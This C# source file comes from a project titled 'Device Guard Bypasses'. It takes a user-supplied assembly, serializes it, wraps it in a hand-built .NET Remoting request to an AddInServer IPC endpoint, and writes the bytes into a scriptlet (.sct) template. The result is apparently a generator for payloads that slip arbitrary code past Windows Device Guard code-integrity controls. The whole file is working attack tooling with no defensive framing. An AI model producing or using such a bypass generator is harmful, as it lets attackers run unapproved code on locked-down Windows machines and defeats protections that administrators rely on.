//  This file is part of Device Guard Bypasses
//
//  Device Guard Bypasses is free software: you can redistribute it 
//  and/or modify it under the terms of the GNU General Public License
//  as published by the Free Software Foundation, either version 3 of 
//  the License, or (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Foobar.  If not, see<http://www.gnu.org/licenses/>.

using CommonLib;
using System;
using System.IO;
using System.Linq;
using System.Text;

namespace CreateAddInIpcData
{
    class Program
    {
        static byte[] BuildRequestBytes(byte[] data, string uri)
        {
            MemoryStream stm = new MemoryStream();            
            BinaryWriter writer = new BinaryWriter(stm);
            writer.Write((uint)0x54454E2E); // Header            
            writer.Write((byte)1); // Major
            writer.Write((byte)0); // Minor
            writer.Write((ushort)0); // OperationType
            writer.Write((ushort)0); // ContentDistribution
            writer.Write(data.Length); // Data Length

            writer.Write((ushort)4); // UriHeader
            writer.Write((byte)1); // DataType
            writer.Write((byte)1); // Encoding: UTF8

            byte[] uriData = Encoding.UTF8.GetBytes(uri);

            writer.Write(uriData.Length); // Length
            writer.Write(uriData); // URI

            writer.Write((ushort)0); // Terminating Header
            writer.Write(data); // Data
            return stm.ToArray();
        }

        const string IPC_URI = "ipc://32a91b0f-30cd-4c75-be79-ccbd6345de11/AddInServer";

        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: assembly.dll output.sct");
                    Environment.Exit(1);
                }

                byte[] ba = BuildRequestBytes(Serializer.SerializeToBytes(new WrappedAssemblyObject(args[0])), IPC_URI);
                File.WriteAllText(args[1], Properties.Resources.Template.Replace("%BYTES%", String.Join("," + Environment.NewLine, ba.Select(b => String.Format("0x{0:X}", b)))));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
